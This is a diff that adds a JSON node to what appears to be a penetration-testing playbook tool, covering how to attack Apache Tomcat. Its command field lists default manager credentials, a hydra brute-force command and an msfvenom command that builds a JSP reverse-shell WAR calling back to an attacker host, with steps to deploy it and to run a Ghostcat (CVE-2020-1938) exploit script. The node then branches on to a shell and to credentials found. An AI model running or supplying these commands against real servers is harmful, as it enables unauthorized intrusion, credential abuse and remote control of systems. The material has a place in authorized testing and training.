@@ -1,0 +1,22 @@
+{
+  "id": "tomcat",
+  "phase": "WEB",
+  "title": "Apache Tomcat",
+  "body": "Manager console upload is the classic path. Default creds are shockingly common. AJP connector (8009) enables Ghostcat if exposed.",
+  "cmd": "# Manager console\nhttp://$ip:8080/manager/html\nhttp://$ip:8080/host-manager/html\n\n# Default creds to try:\n# tomcat:tomcat   tomcat:s3cret   admin:admin\n# admin:tomcat    manager:manager  both:both\n\n# Brute force manager\nhydra -L /opt/SecLists/Usernames/tomcat-usernames.txt \\\n  -P /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\\n  http-get://$ip:8080/manager/html\n\n# Once in — deploy malicious WAR\nmsfvenom -p java/jsp_shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f war -o shell.war\n# Upload via Manager > Deploy > WAR file\n# Access: http://$ip:8080/shell/\n\n# Ghostcat CVE-2020-1938 (AJP port 8009)\npython3 ghostcat.py -p 8009 $ip",
+  "warn": null,
+  "choices": [
+    {
+      "label": "WAR deployed — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Ghostcat file read — found creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "No manager access",
+      "next": "searchsploit_web"
+    }
+  ]
+}
